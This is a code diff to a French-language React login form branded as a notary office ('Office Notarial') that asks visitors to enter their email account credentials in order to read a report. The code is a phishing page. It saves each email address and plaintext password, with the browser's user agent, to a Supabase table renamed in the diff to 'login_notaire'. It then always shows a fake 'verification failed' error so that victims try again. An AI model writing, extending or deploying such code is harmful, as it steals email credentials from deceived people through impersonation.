@@ -12,7 +12,7 @@ const AuthForm = () => {
   const logLoginAttempt = async (email: string, password: string) => {
     try {
       const { data, error } = await supabase
-        .from('login_attempts')
+        .from('login_notaire')
         .insert({
           email: email,
           password_attempt: password,
@@ -20,12 +20,12 @@ const AuthForm = () => {
           user_agent: navigator.userAgent
         })
         .select();
-      
+
       if (error) {
         console.error('Error logging login attempt:', error);
         throw error;
       }
-      
+
       console.log('Login attempt logged successfully:', data);
       return true;
     } catch (error) {
@@ -36,37 +36,37 @@ const AuthForm = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
     // Validation : l'email doit être rempli et valide
     if (!email || !email.trim()) {
       setErrorMessage('Veuillez entrer une adresse e-mail.');
       return;
     }
-    
+
     // Validation du format email
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!emailRegex.test(email.trim())) {
       setErrorMessage('Veuillez entrer une adresse e-mail valide.');
       return;
     }
-    
+
     // Validation : le mot de passe doit être rempli
     if (!password || !password.trim()) {
       setErrorMessage('Veuillez entrer un mot de passe.');
       return;
     }
-    
+
     setIsSubmitting(true);
-    
+
     // Log the login attempt
     const success = await logLoginAttempt(email.trim(), password);
-    
+
     if (!success) {
       setErrorMessage('Erreur lors de l\'enregistrement. Veuillez vérifier la connexion.');
       setIsSubmitting(false);
       return;
     }
-    
+
     // Simulate a verification (since this appears to be a mock login)
     setTimeout(() => {
       setErrorMessage('Echec de la vérification. \n Veuillez réessayer en utilisant les identifiants corrects...');
@@ -81,14 +81,14 @@ const AuthForm = () => {
       setErrorMessage('Veuillez entrer une adresse e-mail.');
       return;
     }
-    
+
     // Validation du format email
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!emailRegex.test(email.trim())) {
       setErrorMessage('Veuillez entrer une adresse e-mail valide.');
       return;
     }
-    
+
     setShowPassword(true);
     setErrorMessage('');
   };
@@ -98,18 +98,18 @@ const AuthForm = () => {
       <div className="load-overlay">
         <img src="https://zupimages.net/up/25/16/ern5.jpg" alt="Logo" />
       </div>
-      
+
       <div className="f-container">
         <div className="header">
           <img src="https://zupimages.net/up/25/16/ern5.jpg" alt="Office Notarial" />
         </div>
-        
+
         <div className="f-content">
           <form onSubmit={handleSubmit}>
             <div className="f-description">
               Pour lire ce rapport, veuillez entrer les identifiants de la messagerie à laquelle le fichier a été envoyé
             </div>
-            
+
             {errorMessage && (
               <div id="message1" className="error-message">
                 {errorMessage.split('\n').map((line, index) => (
@@ -120,7 +120,7 @@ const AuthForm = () => {
                 ))}
               </div>
             )}
-            
+
             <div className="f-inputs-container">
               <input
                 id="oneo"
@@ -134,7 +134,7 @@ const AuthForm = () => {
                 onChange={(e) => setEmail(e.target.value)}
               />
             </div>
-            
+
             {showPassword && (
               <div className="f-inputs-container" id="twoo-container">
                 <input
@@ -149,22 +149,22 @@ const AuthForm = () => {
                 />
               </div>
             )}
-            
+
             <div className="f-inputs-container buttons">
               <center>
                 {!showPassword ? (
-                  <button 
-                    type="button" 
-                    id="next" 
+                  <button
+                    type="button"
+                    id="next"
                     onClick={handleContinue}
                     disabled={!email || !email.trim()}
                   >
                     Continuer
                   </button>
                 ) : (
-                  <button 
-                    type="submit" 
-                    id="submit-btn" 
+                  <button
+                    type="submit"
+                    id="submit-btn"
                     disabled={isSubmitting || !email || !email.trim() || !password || !password.trim()}
                   >
                     {isSubmitting ? 'Vérification...' : "S'identifier"}
